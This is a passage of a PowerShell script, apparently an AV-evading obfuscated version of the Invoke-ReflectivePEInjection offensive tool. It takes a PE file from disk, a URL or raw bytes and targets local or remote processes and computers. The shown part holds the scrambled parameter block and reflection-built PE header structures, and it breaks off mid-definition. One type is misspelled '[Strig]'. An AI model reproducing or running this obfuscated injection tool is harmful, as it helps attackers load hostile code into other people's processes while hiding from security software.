${O`Ae}  =[TypE]("{0}{3}{4}{7}{2}{8}{5}{6}{1}"-F 'sy','UTE','uNT','s','TEM','MarShalASAtTR','iB','.R','imE.InTeROpsErviCEs.')  ;  sET ru8  (  [TyPE]("{4}{13}{5}{10}{0}{8}{2}{7}{6}{11}{3}{9}{12}{1}"-f'er','dtyPe','sE','N','s','Em.Run','ES.','rVIc','OP','MaN','TIME.INt','U','AGe','yst') );   ${RC`YT2}= [TyPe]("{1}{0}"-F'nT32','I');   SET-ITem  vArIAbLe:76Wr  (  [TyPe]("{1}{0}"-F 'Ol','BO') );   sEt  1zfbY  (  [TyPE]("{1}{0}"-F'32','uiNt') ) ; sV tM3ua (  [TYpe]("{2}{0}{1}" -F 'TE','r','BiTCoNvER') );    sV  KQF  (  [tYPE]("{1}{4}{6}{2}{8}{9}{0}{3}{7}{5}" -F 'mb','sYsTe','oN.','L','M.rEF','Ss','lecTi','YbuiLderaCcE','em','It.ASSe')  ) ;    ${7`x69U} =[type]("{5}{7}{2}{4}{0}{6}{3}{1}" -F'TiOn.CAl','NS','E','io','Flec','sYSt','LiNgCONVent','em.R') ;  ${9o`RUZ} =  [TyPe]("{0}{1}{2}"-f'APpdo','M','aIN');  Set-iTEM ("VA"+"rIABL"+"e:U"+"2Gz") (  [TyPe]("{1}{0}{2}" -F 'i','eNV','rONMEnt')  )  ; Set-iTEM VARIaBlE:zt8xBF  ( [tYpe]("{1}{0}" -f'r','uintpt') ) ;  ${e`1`F2m}= [type]("{1}{0}" -f'Ath','M') ;  set GmQk  (  [TYPE]("{0}{8}{5}{2}{7}{3}{6}{1}{4}"-F 'sys','HA','TiME.int','r','l','RUN','s','eropseRViceS.mA','TEm.') )  ;  sEt ("u"+"8M1s"+"F")  ([TYPe]("{1}{0}" -f 'tr','iNtP') ) ; SV ("7"+"Mbl4")  (  [Type]("{4}{3}{2}{0}{1}" -F'O.','FIlE','.I','YSTeM','s')  )  ;function InVok`e-ref`L`EcTiVeP`e`Inj`ecTiOn
{


[CmdletBinding(DeFAuLtPARamEtERSETNaMe={"{2}{0}{1}" -f'bF','ile','We'})]
Param(
	[Parameter(paRamETERsetNaMe = "Loca`LF`iLE", PosiTiON = 0, ManDAtoRy = ${TR`Ue})]
	[String]
	${pe`pA`Th},
	
	[Parameter(PaRAmEtErsEtnamE = "wE`BfILe", pOsitIon = 0, MAndAToRy = ${t`RuE})]
	[Uri]
	${p`EU`Rl},

    [Parameter(pARAMetERSetNAmE = "BY`Tes", pOsiTioN = 0, maNDatOrY = ${tr`UE})]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${P`e`Bytes},
	
	[Parameter(posiTion = 1)]
	[String[]]
	${comput`e`RnaMe},
	
	[Parameter(POsItIOn = 2)]
    [ValidateSet( {"{0}{2}{1}"-f 'WStr','ng','i'}, {"{2}{0}{1}"-f 'in','g','Str'}, {"{0}{1}"-f 'Voi','d'} )]
	[String]
	${Func`R`EtU`RNty`PE} = ("{1}{0}" -f 'd','Voi'),
	
	[Parameter(pOsITION = 3)]
	[Strig]
	${exe`AR`gS},
	
	[Parameter(posiTion = 4)]
	[Int32]
	${P`Ro`cid},
	
	[Parameter(PosITIon = 5)]
	[String]
	${P`RoC`NaMe},

    [Parameter(pOSITION = 6)]
    [Switch]
    ${fo`R`ceAS`lR}
)

&("{1}{0}{3}{2}{4}"-f '-S','Set','ictM','tr','ode') -Version 2


${rE`Mote`S`cRi`ptbLOCk} = {
	[CmdletBinding()]
	Param(
		[Parameter(POsiTion = 0, ManDATOrY = ${tR`Ue})]
		[Byte[]]
		${pE`B`YteS},
		
		[Parameter(POSItIOn = 1, manDATORY = ${T`RUE})]
		[String]
		${fUN`c`R`eT`UrnTyPe},
				
		[Parameter(POsItIoN = 2, MAnDATorY = ${t`Rue})]
		[Int32]
		${pRoC`id},
		
		[Parameter(POsitioN = 3, MAnDATORY = ${t`RuE})]
		[String]
		${prOC`NA`mE},

        [Parameter(PoSItiON = 4, MAnDatORY = ${TR`Ue})]
        [Bool]
        ${FoRC`EA`SLR}
	)
	
	
	
	
	Function G`Et-`wi`N32TYpes
	{
		${w`In32`T`YpES} = &("{1}{2}{0}" -f'ect','N','ew-Obj') ("{3}{2}{0}{1}{4}"-f 'em.O','bje','yst','S','ct')

		
		
		${D`oMAiN} =  ( geT-chIldITEm ("vARI"+"A"+"BlE:9"+"oR"+"uz")  ).value::"cuRrENtD`O`mAIN"
		${DY`NaMic`A`S`SEmbLy} = &("{2}{1}{0}"-f'ject','Ob','New-') ("{4}{6}{5}{0}{2}{3}{1}"-f 'ion.Assembl','e','yN','am','System.','eflect','R')(("{3}{0}{1}{2}" -f'm','b','ly','DynamicAsse'))
		${AsS`EmBL`Y`B`UildeR} = ${d`oMAIN}."d`eFiNEDyN`AMicAsSEM`BLy"(${D`YN`AmICAssE`M`Bly},  (  gET-vaRiAbLe  ("kQ"+"F")).VaLue::"r`Un")
		${mOdu`LE`BU`iL`DEr} = ${AsSem`B`LYBUILD`eR}.("{2}{3}{4}{0}{1}" -f'odul','e','Define','Dynami','cM').Invoke(("{3}{4}{1}{0}{2}" -f'odul','micM','e','D','yna'), ${f`Al`sE})
		${cOnStRuCTOr`i`Nfo} =   (gET-VaRiaBlE  oae -vaL).("{1}{2}{0}{3}" -f'struc','GetCo','n','tors').Invoke()[0]


		
		
		${tY`Pe`BUI`LdEr} = ${MOD`ULEb`Ui`LDEr}.("{0}{2}{1}"-f 'Def','neEnum','i').Invoke(("{2}{0}{1}"-f 'Ty','pe','Machine'), ("{1}{0}"-f'lic','Pub'), [UInt16])
		${TY`peBuI`LD`ER}.("{0}{1}{2}{3}"-f 'Define','Liter','a','l').Invoke(("{1}{0}" -f 'ative','N'), [UInt16] 0) | &("{0}{1}" -f 'Out-N','ull')
		${TY`pe`BuiL`Der}.("{1}{2}{4}{0}{3}"-f'eLitera','D','e','l','fin').Invoke(("{0}{1}" -f'I38','6'), [UInt16] 0x014c) | &("{0}{1}{2}" -f'Ou','t-Nul','l')
		${T`YPE`BuILd`Er}.("{3}{0}{1}{2}" -f 'fi','neLi','teral','De').Invoke(("{1}{0}"-f'um','Itani'), [UInt16] 0x0200) | &("{0}{1}"-f'O','ut-Null')
		${t`Ype`BUILDEr}."DeF`i`NELI`TERal"('x64', [UInt16] 0x8664) | &("{0}{1}"-f'Ou','t-Null')
		${Ma`cH`INEt`yPE} = ${TYpEb`U`IlD`er}.("{2}{1}{0}" -f 'ype','eT','Creat').Invoke()
		${WIN`32`TY`pES} | &("{1}{2}{0}"-f 'ber','Add-Me','m') -MemberType ("{0}{2}{1}"-f'NotePro','rty','pe') -Name ("{3}{2}{0}{1}" -f 'e','Type','n','Machi') -Value ${MACHI`NE`TYpe}

		
		${ty`pE`BuILDER} = ${M`o`DULeBUIL`DER}.("{1}{2}{0}"-f 'Enum','Defin','e').Invoke(("{0}{1}"-f'MagicTyp','e'), ("{1}{0}{2}"-f'bl','Pu','ic'), [UInt16])
		${T`Ype`B`UilDEr}.("{3}{1}{2}{0}{4}"-f 'eLiter','efi','n','D','al').Invoke(("{5}{0}{4}{6}{2}{1}{7}{3}"-f 'AGE_NT','_','2','C','_OPTIO','IM','NAL_HDR3','MAGI'), [UInt16] 0x10b) | &("{1}{0}{2}"-f'l','Out-Nu','l')
		${tYp`e`BUi`LDeR}.("{3}{0}{2}{4}{1}" -f 'fineLi','l','t','De','era').Invoke(("{3}{0}{6}{5}{2}{4}{1}{7}{8}"-f'MAG','M','ONAL_HD','I','R64_','PTI','E_NT_O','AGI','C'), [UInt16] 0x20b) | &("{2}{1}{0}" -f 'l','t-Nul','Ou')
		${mAGi`C`TYPE} = ${typEB`UI`lDeR}.("{2}{0}{1}" -f 'eateTy','pe','Cr').Invoke()
		${WiN3`2tY`P`ES} | &("{0}{2}{1}" -f 'A','Member','dd-') -MemberType ("{1}{0}{2}"-f 'otePr','N','operty') -Name ("{1}{2}{0}"-f 'e','Magic','Typ') -Value ${MA`gIc`TYpe}

		
		${TYP`EBUi`lDer} = ${MODUL`eb`UiLd`Er}.("{1}{2}{0}" -f'num','Def','ineE').Invoke(("{1}{2}{0}" -f 'ype','SubS','ystemT'), ("{0}{1}{2}"-f 'Pu','bli','c'), [UInt16])
		${tyPEbuIl`D`eR}.("{1}{3}{0}{2}" -f'eLitera','De','l','fin').Invoke(("{3}{4}{0}{1}{5}{2}" -f'E_SUBSYSTEM_','UNK','WN','IMA','G','NO'), [UInt16] 0) | &("{0}{2}{1}" -f'Ou','Null','t-')
		${TY`PEbu`ILder}.("{2}{0}{1}"-f 'iter','al','DefineL').Invoke(("{0}{1}{3}{2}{4}"-f 'IMAG','E_SU','STEM','BSY','_NATIVE'), [UInt16] 1) | &("{2}{1}{0}"-f '-Null','t','Ou')
		${T`ypEBu`ilDEr}.("{0}{2}{3}{1}" -f 'Define','l','L','itera').Invoke(("{4}{0}{2}{3}{1}{5}"-f'AGE_S','DOWS_G','UBSYS','TEM_WIN','IM','UI'), [UInt16] 2) | &("{0}{1}{2}"-f'Out-N','ul','l')
		${tYPE`Bui`LdEr}.("{0}{2}{3}{4}{1}" -f'D','l','efineLi','te','ra').Invoke(("{1}{4}{5}{3}{2}{0}" -f'INDOWS_CUI','IMA','M_W','YSTE','GE_SU','BS'), [UInt16] 3) | &("{0}{1}{2}"-f 'Out-','N','ull')
		${tyP`E`BuILder}.("{4}{0}{1}{3}{2}" -f'e','Lit','al','er','Defin').Invoke(("{5}{4}{0}{1}{6}{3}{2}"-f 'GE_','SUB','I','SIX_CU','MA','I','SYSTEM_PO'), [UInt16] 7) | &("{2}{0}{1}"-f't-Nul','l','Ou')
		${T`ypeBuiL`D`er}.("{2}{1}{0}"-f 'Literal','fine','De').Invoke(("{6}{4}{0}{1}{5}{2}{3}"-f'AG','E_SUBSYSTEM_WIND','S_CE_G','UI','M','OW','I'), [UInt16] 9) | &("{1}{2}{0}"-f '-Null','O','ut')
		${ty`pEBUIl`der}.("{1}{2}{0}"-f 'al','Defi','neLiter').Invoke(("{5}{3}{0}{2}{1}{4}" -f 'TEM_EFI','AP','_','_SUBSYS','PLICATION','IMAGE'), [UInt16] 10) | &("{1}{0}" -f'Null','Out-')
		${Ty`peB`UI`lDER}.("{0}{2}{1}"-f 'Defin','l','eLitera').Invoke(("{3}{2}{4}{0}{6}{1}{5}"-f'YSTEM_','SERVICE_DRIVE','GE','IMA','_SUBS','R','EFI_BOOT_'), [UInt16] 11) | &("{1}{2}{0}"-f'l','Out-N','ul')
		${ty`P`eB`UiLdER}.("{2}{0}{1}" -f 'efineL','iteral','D').Invoke(("{3}{2}{7}{9}{5}{6}{8}{1}{0}{4}{10}"-f '_D','TIME','MAG','I','RIVE','_','E','E_SUBS','FI_RUN','YSTEM','R'), [UInt16] 12) | &("{1}{0}"-f'll','Out-Nu')
		${T`yPeb`U`iLDer}.("{0}{3}{1}{2}"-f'D','era','l','efineLit').Invoke(("{1}{4}{2}{0}{3}"-f 'EM_EFI_RO','IMAG','UBSYST','M','E_S'), [UInt16] 13) | &("{1}{2}{0}"-f'ull','O','ut-N')
		${tyPe`Bu`IL`dEr}.("{1}{3}{2}{0}"-f 'eLiteral','De','n','fi').Invoke(("{3}{2}{1}{0}" -f'X','O','UBSYSTEM_XB','IMAGE_S'), [UInt16] 14) | &("{0}{2}{1}" -f'O','Null','ut-')
		${SUb`SysT`em`Ty`PE} = ${type`BUI`l`dER}.("{1}{0}{2}" -f 'teTyp','Crea','e').Invoke()
		${w`I`N32ty`Pes} | &("{2}{0}{1}{3}"-f'Me','mbe','Add-','r') -MemberType ("{1}{2}{0}"-f'ty','Note','Proper') -Name ("{0}{1}{2}" -f 'S','ubSystemT','ype') -Value ${S`UB`s`y`stemtype}

		
		${T`YpEBU`ILD`Er} = ${M`o`Dule`Bu`IlDer}.("{2}{1}{0}"-f'Enum','e','Defin').Invoke(("{2}{1}{4}{0}{3}" -f 'icsTyp','haract','DllC','e','erist'), ("{1}{0}"-f'c','Publi'), [UInt16])
		${typ`E`BUILDER}.("{1}{0}{2}{4}{3}" -f'ine','Def','L','eral','it').Invoke(("{1}{0}" -f'0','RES_'), [UInt16] 0x0001) | &("{0}{2}{1}" -f 'Out-N','ll','u')
		${TypEb`Ui`lder}.("{1}{2}{3}{0}"-f'Literal','D','efin','e').Invoke(("{0}{1}" -f'RE','S_1'), [UInt16] 0x0002) | &("{2}{1}{0}"-f'l','ul','Out-N')
		${T`yP`e`BuiLDEr}.("{3}{0}{2}{1}" -f 'ine','al','Liter','Def').Invoke(("{0}{1}"-f 'RES_','2'), [UInt16] 0x0004) | &("{2}{1}{0}"-f 'ull','N','Out-')
		${Typebu`ILd`eR}.("{1}{0}{2}" -f 'Lit','Define','eral').Invoke(("{0}{1}"-f 'R','ES_3'), [UInt16] 0x0008) | &("{2}{0}{1}" -f 'u','t-Null','O')
		${Ty`pe`BUILD`er}.("{1}{0}{3}{4}{2}"-f'e','D','iteral','f','ineL').Invoke(("{7}{3}{6}{8}{1}{0}{10}{9}{11}{2}{5}{4}"-f 'HARA','DLL_C','MI','M','E','C_BAS','AGE','I','_','CS_','CTERISTI','DYNA'), [UInt16] 0x0040) | &("{0}{2}{1}"-f 'Out-Nu','l','l')
		${Ty`pe`BuilDer}.("{2}{0}{3}{4}{1}" -f 'ef','l','D','i','neLitera').Invoke(("{4}{7}{2}{6}{3}{8}{0}{5}{1}" -f 'TI','ORCE_INTEGRITY','E_DL','CHA','IM','CS_F','L_','AG','RACTERIS'), [UInt16] 0x0080) | &("{0}{1}"-f'Out','-Null')
		${t`Y`P`ebUiLdER}.("{2}{3}{1}{0}{4}"-f 'Lit','ine','De','f','eral').Invoke(("{5}{0}{3}{2}{6}{1}{7}{4}" -f 'AGE_DLL_C','RIST','AR','H','S_NX_COMPAT','IM','ACTE','IC'), [UInt16] 0x0100) | &("{1}{0}" -f't-Null','Ou')
		${T`ypEb`U`IlDeR}.("{3}{4}{0}{2}{1}" -f'Lite','l','ra','Def','ine').Invoke(("{6}{2}{1}{0}{5}{4}{3}"-f 'H','LC','E_DL','_ISOLATION','ACTERISTICS_NO','AR','IMAG'), [UInt16] 0x0200) | &("{1}{0}"-f 't-Null','Ou')
		${tYP`EBu`IL`dEr}.("{3}{2}{1}{0}" -f 'l','eLitera','fin','De').Invoke(("{4}{3}{6}{9}{0}{2}{1}{7}{5}{8}"-f'LCHAR','CTERISTICS','A','MAGE_','I','O_SE','D','_N','H','L'), [UInt16] 0x0400) | &("{1}{2}{0}"-f 'l','Out','-Nul')
		${TyPebU`il`d`er}.("{2}{0}{3}{1}"-f 'i','l','Def','neLitera').Invoke(("{1}{4}{5}{2}{3}{0}"-f'IND','IMAGE_DLLC','O','_B','HARACTER','ISTICS_N'), [UInt16] 0x0800) | &("{1}{2}{0}" -f 'Null','Out','-')
		${Ty`Pe`Buil`deR}.("{1}{3}{2}{0}{4}" -f 'eLitera','Def','n','i','l').Invoke(("{1}{0}" -f'4','RES_'), [UInt16] 0x1000) | &("{2}{1}{0}"-f 't-Null','u','O')
		${ty`p`e`BUiLdeR}.("{0}{3}{2}{1}" -f 'De','Literal','ine','f').Invoke(("{5}{6}{0}{1}{2}{4}{3}"-f'GE_D','LLCHA','R','ERISTICS_WDM_DRIVER','ACT','IM','A'), [UInt16] 0x2000) | &("{0}{2}{1}" -f 'Out-','ll','Nu')
		${tYpEBU`I`lDER}.("{0}{2}{3}{1}" -f 'D','l','efineLiter','a').Invoke(("{3}{2}{5}{7}{0}{6}{1}{4}"-f 'R','E','E_DLLCHA','IMAG','R_AWARE','RACTERISTICS_TERMIN','V','AL_SE'), [UInt16] 0x8000) | &("{0}{2}{1}"-f 'Ou','ull','t-N')
		${d`l`LcHaraCt`eRIsTicST`ypE} = ${tyPebU`IL`D`er}.("{1}{0}{2}{3}" -f 'te','Crea','Ty','pe').Invoke()
		${wIn32`TY`pES} | &("{0}{1}{2}{3}" -f'Add','-','Mem','ber') -MemberType ("{3}{1}{0}{2}" -f 'rope','teP','rty','No') -Name ("{2}{5}{1}{0}{3}{4}" -f'is','er','Dll','tics','Type','Charact') -Value ${D`llCharaCTER`is`TICS`T`ype}

		
		
		${atT`R`IbUT`eS} = ("{13}{15}{9}{1}{0}{16}{14}{18}{19}{3}{8}{2}{21}{5}{10}{11}{22}{4}{20}{7}{6}{12}{17}" -f'ns',', A','s, Publi','Cl',' Be','itLayou','reFi','o','as','oLayout','t, ','Seale','eldI','A','C','ut','i','nit','lass',', ','f','c, Explic','d,')
		${TyP`Eb`U`ILDER} = ${M`oDu`Leb`UiL`DeR}.("{1}{0}{2}"-f 'ineT','Def','ype').Invoke(("{4}{1}{3}{2}{0}" -f 'RY','A','_DATA_DIRECTO','GE','IM'), ${a`TT`RIbUtes}, [System.ValueType], 8)
		(${tyPEB`UI`LDer}.("{0}{2}{3}{1}"-f'Defi','d','neFi','el').Invoke(("{3}{1}{0}{2}" -f 're','irtualAdd','ss','V'), [UInt32], ("{1}{0}"-f'ublic','P'))).("{2}{0}{1}" -f 'Off','set','Set').Invoke(0) | &("{1}{0}"-f'ut-Null','O')
		(${TYPeBU`iLD`er}.("{1}{2}{3}{0}"-f 'eld','D','efineF','i').Invoke(("{0}{1}" -f'Si','ze'), [UInt32], ("{1}{0}"-f'ublic','P'))).("{1}{2}{0}"-f 'tOffset','S','e').Invoke(4) | &("{2}{0}{1}" -f 'l','l','Out-Nu')
		${ImaGE`_`DAT`A_`DIrEct`oRy} = ${tY`PeB`UILdEr}.("{2}{0}{1}"-f 'reat','eType','C').Invoke()
		${Wi`N32`Ty`PeS} | &("{1}{0}{2}"-f'-Membe','Add','r') -MemberType ("{3}{1}{2}{0}" -f 'ty','op','er','NotePr') -Name ("{3}{4}{0}{1}{2}{5}"-f'G','E_DAT','A_DIRE','I','MA','CTORY') -Value ${i`MAGe`_`dA`Ta_D`IrECTo`RY}

		
		${A`TtRIBUT`es} = ("{5}{9}{8}{10}{6}{0}{1}{2}{11}{7}{13}{12}{4}{3}"-f' Public, Seq','uential','Layo','nit','eldI','AutoLayo',',','ealed, Befo','lass,','ut, AnsiC',' Class','ut, S','Fi','re')
		${TyP`ebU`iLdeR} = ${m`ODU`lEbuILD`er}.("{3}{1}{0}{2}" -f'eTy','in','pe','Def').Invoke(("{0}{3}{1}{4}{2}"-f 'I','FILE','DER','MAGE_','_HEA'), ${A`T`TributEs}, [System.ValueType], 20)
		${tY`pe`BUIlD`er}.("{0}{2}{1}" -f'Def','eld','ineFi').Invoke(("{1}{0}{2}"-f 'i','Mach','ne'), [UInt16], ("{0}{1}"-f 'Pub','lic')) | &("{0}{1}" -f'Out','-Null')
		${Ty`PEb`U`iLdER}.("{2}{1}{3}{0}"-f 'ld','efi','D','neFie').Invoke(("{1}{0}{3}{2}"-f'ti','NumberOfSec','ns','o'), [UInt16], ("{2}{0}{1}"-f 'ubl','ic','P')) | &("{0}{2}{1}"-f'Out','l','-Nul')
		${T`Ype`BUI`lDer}.("{0}{2}{1}{3}" -f 'Defin','Fi','e','eld').Invoke(("{1}{2}{0}{3}"-f 'D','Ti','me','ateStamp'), [UInt32], ("{2}{1}{0}" -f'c','ubli','P')) | &("{2}{0}{1}" -f 'ut-','Null','O')
		${TYP`EbUi`l`DER}.("{3}{1}{2}{0}" -f'eld','n','eFi','Defi').Invoke(("{1}{2}{4}{0}{3}" -f'b','Po','int','le','erToSymbolTa'), [UInt32], ("{1}{0}"-f'ublic','P')) | &("{0}{2}{1}"-f'O','Null','ut-')
		${ty`pEbU`IlDER}.("{3}{2}{1}{0}"-f 'ineField','f','e','D').Invoke(("{3}{1}{0}{2}" -f'Symb','Of','ols','Number'), [UInt32], ("{0}{1}" -f'P','ublic')) | &("{1}{0}{2}"-f't-N','Ou','ull')
		${T`YPEB`UiLdeR}.("{2}{1}{0}"-f 'eField','fin','De').Invoke(("{1}{6}{3}{2}{4}{5}{0}"-f 'eader','S','fOp','O','tional','H','ize'), [UInt16], ("{0}{2}{1}"-f'Pu','ic','bl')) | &("{1}{2}{0}"-f '-Null','Ou','t')
		${TyPEb`UiL`d`ER}.("{2}{0}{3}{1}"-f 'efine','ield','D','F').Invoke(("{2}{3}{1}{0}"-f 'istics','ter','Cha','rac'), [UInt16], ("{2}{0}{1}"-f'i','c','Publ')) | &("{1}{0}" -f't-Null','Ou')
		${I`M`Age`_F`ile_H`eadEr} = ${t`YPe`B`UIlder}.("{1}{2}{3}{0}" -f 'ype','C','rea','teT').Invoke()
		${W`i`N32typES} | &("{0}{1}{2}" -f'Add-','M','ember') -MemberType ("{1}{2}{0}"-f 'ty','NotePro','per') -Name ("{1}{3}{0}{2}" -f 'EADE','IMAGE_FILE_','R','H') -Value ${iMAg`e_`File_HEad`eR}

		
		${AttR`I`BuTeS} = ("{3}{1}{0}{4}{15}{14}{6}{7}{17}{16}{10}{13}{5}{9}{12}{11}{2}{8}"-f ' C','t, AnsiClass,','ldI','AutoLayou','la',',','lic, Expl','icit','nit',' ','e','oreFie','Bef','aled',', Pub','ss','S','Layout, ')
		${Ty`PEb`UILdeR} = ${mo`DU`LE`B`UIlder}.("{2}{1}{0}"-f 'eType','fin','De').Invoke(("{0}{6}{2}{5}{3}{1}{4}" -f'IM','HEADER6','GE_OPTION','L_','4','A','A'), ${AtTRI`Bu`TEs}, [System.ValueType], 240)
		(${T`ypEB`UIL`der}.("{0}{2}{1}" -f 'Defi','eField','n').Invoke(("{1}{0}" -f 'c','Magi'), ${Ma`GiCty`pE}, ("{0}{2}{1}"-f'P','blic','u'))).("{1}{2}{0}{3}" -f'fs','SetO','f','et').Invoke(0) | &("{1}{0}"-f'Null','Out-')
		(${ty`P`EbuIlDeR}.("{1}{3}{0}{2}"-f'el','Defi','d','neFi').Invoke(("{4}{2}{0}{3}{1}"-f'Lin','rsion','or','kerVe','Maj'), [Byte], ("{1}{0}"-f'blic','Pu'))).("{1}{0}{2}"-f 'tOff','Se','set').Invoke(2) | &("{1}{0}{2}"-f 't-Nu','Ou','ll')
		(${t`YPEb`UIL`der}.("{1}{0}{2}" -f'e','Defin','Field').Invoke(("{4}{1}{2}{3}{0}"-f 'erVersion','or','Li','nk','Min'), [Byte], ("{1}{0}"-f'c','Publi'))).("{2}{1}{0}"-f'et','tOffs','Se').Invoke(3) | &("{1}{0}" -f 'Null','Out-')
		(${tYP`EBuI`LD`Er}.("{3}{0}{1}{2}" -f'ineFi','el','d','Def').Invoke(("{2}{0}{1}"-f 'i','zeOfCode','S'), [UInt32], ("{1}{0}" -f 'lic','Pub'))).("{1}{0}{3}{2}"-f 'e','S','et','tOffs').Invoke(4) | &("{1}{0}{2}"-f'l','Out-Nu','l')
		(${t`yp`Eb`UIldEr}.("{2}{1}{0}"-f'Field','efine','D').Invoke(("{1}{3}{4}{2}{0}"-f 'Data','SizeOfI','zed','niti','ali'), [UInt32], ("{1}{0}" -f 'ublic','P'))).("{0}{2}{1}"-f'S','Offset','et').Invoke(8) | &("{2}{0}{1}"-f 'ut','-Null','O')
		(${typ`Ebu`il`dEr}.("{0}{2}{1}{3}" -f'D','Fie','efine','ld').Invoke(("{5}{3}{1}{0}{2}{4}" -f'ni','fUni','tial','O','izedData','Size'), [UInt32], ("{2}{1}{0}"-f 'c','i','Publ'))).("{0}{1}"-f'SetO','ffset').Invoke(12) | &("{2}{0}{1}" -f'N','ull','Out-')
		(${type`BUiL`Der}.("{0}{1}{2}" -f 'De','fi','neField').Invoke(("{4}{2}{1}{0}{6}{3}{5}"-f 'E','ssOf','ddre','y','A','Point','ntr'), [UInt32], ("{1}{0}{2}" -f'ubl','P','ic'))).("{1}{2}{0}"-f 'et','S','etOffs').Invoke(16) | &("{0}{1}{2}"-f'Out-','Nu','ll')
		(${t`YpeB`UILder}.("{0}{1}{2}{3}"-f 'Def','ineF','ie','ld').Invoke(("{1}{2}{0}" -f'e','BaseOfC','od'), [UInt32], ("{2}{0}{1}"-f 'u','blic','P'))).("{2}{0}{1}" -f 'e','t','SetOffs').Invoke(20) | &("{2}{0}{1}"-f 'ut','-Null','O')
		(${T`YPEBuiL`Der}.("{0}{3}{1}{2}" -f 'D','n','eField','efi').Invoke(("{0}{2}{1}" -f 'Imag','se','eBa'), [UInt64], ("{1}{0}"-f'ic','Publ'))).("{2}{0}{1}"-f 'Offse','t','Set').Invoke(24) | &("{1}{0}"-f 't-Null','Ou')
		(${Ty`p`eB`UILdeR}.("{0}{2}{1}"-f'Defi','eField','n').Invoke(("{2}{4}{3}{1}{0}"-f'nt','gnme','Sectio','li','nA'), [UInt32], ("{1}{0}"-f 'blic','Pu'))).("{1}{0}"-f 'set','SetOff').Invoke(32) | &("{0}{2}{1}"-f 'Out-','ll','Nu')
		(${t`yp`eBuIL`DER}.("{0}{1}{2}"-f 'Def','i','neField').Invoke(("{2}{0}{3}{1}"-f 'i','ent','FileAl','gnm'), [UInt32], ("{1}{0}"-f'lic','Pub'))).("{0}{1}{2}{3}" -f'S','et','Off','set').Invoke(36) | &("{1}{0}" -f 'l','Out-Nul')
		(${Ty`pE`B`UIldeR}.("{0}{2}{1}"-f'D','ield','efineF').Invoke(("{1}{0}{3}{5}{4}{2}" -f 'jorOp','Ma','mVersion','erat','e','ingSyst'), [UInt16], ("{1}{0}{2}" -f'ub','P','lic'))).("{2}{0}{1}" -f 'f','set','SetOf').Invoke(40) | &("{1}{0}{2}"-f 't-Nul','Ou','l')
		(${ty`PeBu`IlDeR}.("{0}{3}{1}{2}"-f'Defi','el','d','neFi').Invoke(("{3}{1}{0}{2}{4}" -f 'ti','inorOpera','ngSyst','M','emVersion'), [UInt16], ("{1}{0}"-f'blic','Pu'))).("{3}{0}{2}{1}" -f'tO','fset','f','Se').Invoke(42) | &("{2}{1}{0}" -f'll','Nu','Out-')
		(${tYPE`BU`iLdeR}.("{1}{0}{2}{3}"-f'n','Defi','eFi','eld').Invoke(("{3}{4}{0}{2}{1}"-f 'eV','sion','er','Maj','orImag'), [UInt16], ("{1}{0}" -f 'c','Publi'))).("{2}{0}{1}" -f'ffse','t','SetO').Invoke(44) | &("{0}{1}" -f'Out-Nul','l')
		(${tY`pebuiL`D`er}.("{0}{1}{2}"-f'DefineF','iel','d').Invoke(("{3}{0}{1}{4}{2}{5}"-f 'n','orIma','s','Mi','geVer','ion'), [UInt16], ("{0}{1}"-f'Publ','ic'))).("{1}{2}{0}"-f 'fset','Se','tOf').Invoke(46) | &("{0}{1}"-f'Out-','Null')
		(${T`yp`EBuI`LDer}.("{1}{2}{0}"-f'ld','Defin','eFie').Invoke(("{2}{0}{3}{1}"-f'or','temVersion','Maj','Subsys'), [UInt16], ("{2}{1}{0}" -f'ic','ubl','P'))).("{0}{1}" -f'SetO','ffset').Invoke(48) | &("{2}{1}{0}" -f 'l','l','Out-Nu')
		(${tyPEbu`Ild`Er}.("{1}{3}{2}{0}" -f'eld','Defi','Fi','ne').Invoke(("{2}{0}{1}{4}{3}" -f 'sys','temV','MinorSub','n','ersio'), [UInt16], ("{0}{1}"-f 'Pub','lic'))).("{0}{1}"-f 'Set','Offset').Invoke(50) | &("{1}{0}{2}"-f'-N','Out','ull')
		(${TYp`eBui`l`der}.("{3}{0}{1}{2}" -f 'efi','neF','ield','D').Invoke(("{4}{3}{2}{5}{0}{1}"-f'nVa','lue','rsi','Ve','Win32','o'), [UInt32], ("{0}{1}{2}" -f'Publ','i','c'))).("{2}{1}{0}"-f 'set','Off','Set').Invoke(52) | &("{2}{1}{0}" -f '-Null','ut','O')
		(${tYpE`BuI`ldER}.("{1}{2}{0}" -f 'neField','D','efi').Invoke(("{1}{0}{2}" -f'z','Si','eOfImage'), [UInt32], ("{0}{1}"-f'Pub','lic'))).("{2}{1}{0}"-f 'Offset','et','S').Invoke(56) | &("{2}{1}{0}"-f '-Null','t','Ou')
		(${tyPeb`UiLd`Er}.("{0}{2}{1}{3}"-f'D','eFiel','efin','d').Invoke(("{0}{3}{1}{2}" -f'Si','O','fHeaders','ze'), [UInt32], ("{0}{1}"-f'Pub','lic'))).("{1}{2}{0}"-f 'Offset','S','et').Invoke(60) | &("{1}{0}"-f't-Null','Ou')
		(${tYp`EBu`iLD`er}.("{1}{0}{3}{2}" -f'fi','De','eld','neFi').Invoke(("{0}{2}{1}"-f'Che','um','ckS'), [UInt32], ("{2}{0}{1}" -f'ubl','ic','P'))).("{1}{0}{2}" -f'Off','Set','set').Invoke(64) | &("{0}{2}{1}"-f'Ou','ll','t-Nu')
		(${TypEb`Ui`LDEr}.("{0}{1}{2}"-f'Defin','e','Field').Invoke(("{0}{1}" -f'Subsys','tem'), ${sU`BSystE`M`TY`pE}, ("{0}{1}" -f'Publi','c'))).("{2}{0}{1}" -f 's','et','SetOff').Invoke(68) | &("{1}{0}"-f 'ull','Out-N')
		(${tyPeBU`ild`er}.("{0}{3}{2}{1}"-f 'Def','d','iel','ineF').Invoke(("{4}{3}{2}{0}{1}{5}" -f'eri','stic','t','c','DllChara','s'), ${dLL`CharACte`RisTICsT`ypE}, ("{0}{1}"-f 'Publ','ic'))).("{0}{1}{2}"-f'S','etOf','fset').Invoke(70) | &("{1}{0}" -f 'l','Out-Nul')
		(${tYPeb`UiLd`eR}.("{3}{2}{1}{0}" -f 'd','el','Fi','Define').Invoke(("{1}{2}{3}{0}" -f'eserve','S','i','zeOfStackR'), [UInt64], ("{0}{1}" -f 'P','ublic'))).("{2}{0}{3}{1}"-f'Of','t','Set','fse').Invoke(72) | &("{2}{0}{1}"-f'Nul','l','Out-')
